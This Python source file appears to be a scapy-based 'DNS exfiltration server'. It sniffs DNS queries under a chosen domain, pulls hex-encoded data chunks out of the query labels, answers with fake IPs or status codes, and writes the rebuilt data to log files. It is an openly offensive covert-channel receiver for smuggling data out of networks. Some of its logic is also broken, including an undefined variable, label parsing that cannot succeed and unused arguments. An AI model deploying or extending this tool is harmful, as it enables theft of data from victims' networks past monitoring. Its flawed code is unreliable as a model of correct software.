from enum import Enum
import os
from random import choice
import time
import argparse
from scapy.all import DNS, DNSQR, DNSRR, send, sniff, IP, UDP

class ReceivedPacketTypes(Enum):
    START = 'a'
    DATA = 'b'

class SentPacketTypes(Enum):
    OK = 200
    MALFORMED = 201
    NX = 202  # non-existent
    OOO = 203  # out of order
    MAX = 204  # reached max connection

# Exceptions
class ShortCircuitException(Exception):
    pass

class UnrelatedException(Exception):
    pass

class DNSSyntaxException(Exception):
    pass

class ServerMaxConnectionsException(Exception):
    pass

class NXConnectionException(Exception):
    pass

class PacketsOutOfOrderException(Exception):
    pass

class DataParser:
    def __init__(self, ip):
        self.last_received = -1
        self.data = bytearray()
        self.ip = ip

    def get_length(self):
        return len(self.data)

    def add(self, packet_number: int, data: bytes):
        if packet_number == self.last_received:
            print("Repeated packet")
            raise ShortCircuitException()
        if not (packet_number > self.last_received or packet_number == 0):
            self.last_received = 0
            raise PacketsOutOfOrderException()
        try:
            data.decode('ascii')
            self.data.extend(data)
        except:
            print(f"Unable to decode last data packet: {data}")
        finally:
            self.last_received = packet_number

    def parse_all(self):
        return self.data.decode('ascii')

    def save_to_disk(self, path: str, id: int):
        print(f"Saving data to disk for connection {id} from IP {self.ip}")
        try:
            os.makedirs(path, exist_ok=True)
            file_path = f'{path}/{id}-{self.ip}-{int(time.time())}.log'
            with open(file_path, 'x', encoding='ascii') as file:
                file.write(self.data.decode('ascii'))
        except Exception as e:
            print(f"Error saving data: {e}")


class DataParserManager:
    def __init__(self):
        self.parsers = []

    def add_parser(self, parser: DataParser):
        self.parsers.append(parser)

    def parse(self, data: str):
        try:
            # Split data and limit to first three parts before parsing
            parts = data.split(".")
            print(f"Received data: {data}")  # Debugging: print the raw data

            if len(parts) < 3:
                print(f"Dot exceed or insufficient parts. Received parts: {parts}")
                raise DNSSyntaxException()

            # Reconstruct the data string
            packet_number = parts[0]
            connection_id = parts[1]
            hex_data = parts[2]

            print(f"Packet Number: {packet_number}, Connection ID: {connection_id}, Hex Data: {hex_data}")

            # If there are extra parts before the domain, ignore them for now
            domain_parts = ".".join(parts[3:])
            print(f"Domain: {domain_parts}")

            if domain_parts.lower() != domain.lower():
                raise ShortCircuitException()

            if len(hex_data) % 2 == 1:
                print("Odd length")
                raise DNSSyntaxException()

            packet_number = int(packet_number)
            connection_id = int(connection_id)

            if connection_id > len(self.parsers):
                raise NXConnectionException()

            parser = self.parsers[connection_id - 1]
            parser.add(packet_number, bytes.fromhex(hex_data))
            return (packet_number, connection_id - 1)

        except (ValueError, IndexError):
            print("Skipping malformed data - invalid format")
            raise DNSSyntaxException()


    def number_of_connections(self):
        return len(self.parsers)  # This is the method to track connections

    def save_parsers(self, save_path: str):
        os.makedirs(save_path, exist_ok=True)
        for i, parser in enumerate(self.parsers):
            parser.save_to_disk(save_path, i + 1)

def create_fake_ip(connections: int):
    if connections > 254:
        raise ServerMaxConnectionsException()

    reserved = [0, 10, 100, 127, 169, 172, 192, 198, 203, 224, 233, 250, 255]
    fake = str(choice([i for i in range(1, 254) if i not in reserved]))
    fake += "." + ".".join(str(choice(range(256))) for _ in range(2)) + f".{connections + 1}"
    return fake

def create_response(ip: str, request):
    response = IP(dst=request[IP].src)/UDP(dport=request[UDP].sport, sport=53)/DNS(
        id=request[DNS].id, qr=1, aa=1, ra=1, qd=request[DNS].qd, an=DNSRR(rrname=request[DNSQR].qname, rdata=ip)
    )
    return response

def handle_query(pkt, domain, data_parsers):
    print(f"Full query received: {pkt[DNSQR].qname.decode()}")
    try:
        pkt.show()
        if pkt[DNS].qd.qtype != 1:  # A record query only
            raise UnrelatedException()

        data = get_data(pkt[DNSQR].qname.decode(), domain)
        data_type, rest = data.split('.', 1)

        if data_type == ReceivedPacketTypes.START.value:
            print(f"Starting connection: {data_parsers.number_of_connections()}")
            response_ip = create_fake_ip(data_parsers.number_of_connections())
            data_parsers.add_parser(DataParser(pkt[IP].src))
            response = create_response(response_ip, pkt)

        elif data_type == ReceivedPacketTypes.DATA.value:
            print(f"Received DATA packet from connection: {data_parsers.number_of_connections()}")
            metadata = data_parsers.parse(rest)
            print(f"Parsing data from {metadata[1]}")
            response = create_response(str(SentPacketTypes.OK.value), pkt)

        else:
            raise UnrelatedException()

        send(response)

    except ShortCircuitException:
        print("Short circuit: sending nothing.")
    except UnrelatedException:
        print("Treating request as normal DNS query")
    except DNSSyntaxException:
        response = create_response(str(SentPacketTypes.MALFORMED.value), pkt)
        send(response)
    except ServerMaxConnectionsException:
        response = create_response(str(SentPacketTypes.MAX.value), pkt)
        send(response)
    except NXConnectionException:
        response = create_response(str(SentPacketTypes.NX.value), pkt)
        send(response)
    except PacketsOutOfOrderException:
        response = create_response(str(SentPacketTypes.OOO.value), pkt)
        send(response)

def get_data(full: str, domain: str):
    stripped = full.rstrip('.').lower()
    domain = domain.lower()

    if not (stripped == domain or stripped.endswith("." + domain)):
        raise ShortCircuitException()

    if stripped.count('.') != domain.count('.') + 4:
        raise UnrelatedException()

    return full[:full.index('.', full.index('.') + 1)]

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="DNS exfiltration server")
    parser.add_argument('-p', '--port', help='port to listen on', type=int, default=53)
    parser.add_argument('ip', type=str)
    parser.add_argument('domain', type=str)
    args = parser.parse_args()

    SAVE_PATH = "./logs"
    DOMAIN = args.domain
    data_parsers = DataParserManager()

    print("Listening for DNS traffic...")
    sniff(filter="udp port 53", prn=lambda pkt: handle_query(pkt, DOMAIN, data_parsers), store=0)

    data_parsers.save_parsers(SAVE_PATH)
    print("Goodbye.")